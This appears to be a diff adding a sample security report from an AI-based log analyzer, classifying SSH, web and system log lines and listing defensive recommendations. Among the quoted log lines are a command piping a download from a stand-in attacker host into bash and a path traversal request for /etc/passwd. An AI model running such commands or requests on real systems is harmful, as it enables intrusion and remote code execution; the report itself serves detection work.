@@ -1,0 +1,47 @@
+============================================================
+AI POWERED LOGS ANALYZER - SECURITY REPORT
+============================================================
+Generated At: 2026-03-22 19:12:00.829030
+
+SUMMARY
+------------------------------------------------------------
+Total Logs Processed: 14
+Normal: 3
+Failed Login: 0
+Brute Force: 6
+Suspicious: 2
+Critical: 2
+Malware Attempt: 1
+Threat Score (0-100): 100
+Brute Force IPs: ['192.168.1.10', '203.0.113.5']
+Top Suspicious IPs: [('192.168.1.10', 3), ('203.0.113.5', 3)]
+Failed Login Counts: {'192.168.1.10': 3, '203.0.113.5': 3}
+
+DETAILED RESULTS
+------------------------------------------------------------
+[Normal] (Confidence: 0.50) Accepted password for kali from 192.168.1.20 port 22 ssh2
+[Normal] (Confidence: 0.53) session opened for user root by (uid=0)
+[Brute Force] (Confidence: 0.59) Failed password for invalid user admin from 192.168.1.10 port 22 ssh2
+[Brute Force] (Confidence: 0.55) Failed password for root from 192.168.1.10 port 22 ssh2
+[Brute Force] (Confidence: 0.62) Failed password for invalid user test from 192.168.1.10 port 22 ssh2
+[Suspicious] (Confidence: 0.67) GET /phpmyadmin HTTP/1.1 404 512
+[Suspicious] (Confidence: 0.75) GET /../../../../etc/passwd HTTP/1.1 400 100
+[Critical] (Confidence: 0.45) systemd[1]: Failed to start Apache Web Server
+[Critical] (Confidence: 0.43) kernel panic - not syncing: Fatal exception
+[Malware Attempt] (Confidence: 0.42) curl http://evil.example.com/dropper | bash
+[Brute Force] (Confidence: 0.50) sshd[2201]: Failed password for invalid user guest from 203.0.113.5 port 22 ssh2
+[Brute Force] (Confidence: 0.44) sshd[2202]: Failed password for root from 203.0.113.5 port 22 ssh2
+[Brute Force] (Confidence: 0.32) pam_unix(sshd:auth): authentication failure; rhost=203.0.113.5 user=root
+[Normal] (Confidence: 0.40) apache2: server started successfully
+
+RECOMMENDATIONS
+------------------------------------------------------------
+- Enable fail2ban or account lockout policies to block brute-force attempts.
+- Review SSH access and restrict root login.
+- Investigate suspicious commands and scan the affected host for malware.
+- Review executed shell commands and recent downloaded files.
+- Check service failures and critical errors immediately.
+- Review system logs for crashes, kernel issues, or service interruptions.
+- Inspect suspicious IP addresses and web requests for scanning or exploitation attempts.
+- Consider adding WAF/firewall rules or IDS signatures.
+- High threat level detected. Escalate to security team immediately.
